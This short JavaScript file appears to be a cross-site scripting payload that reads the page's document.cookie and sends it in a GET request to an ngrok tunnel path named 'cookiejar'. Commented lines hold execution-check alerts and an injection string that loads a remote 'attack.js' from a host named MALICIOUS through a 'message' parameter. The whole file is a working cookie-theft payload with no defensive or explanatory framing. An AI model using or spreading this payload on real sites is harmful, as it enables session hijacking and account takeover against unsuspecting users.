//alert('hello')

var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://b52e21e8.ngrok.io/cookiejar?c='" + escape(document.cookie) + "'", false ); // false for synchronous request
xmlHttp.send( null );

//console.log('execution occurred')
//alert('execution occurred')

//message=<script src='http://MALICIOUS.ngrok.io/static/attack.js'></script>
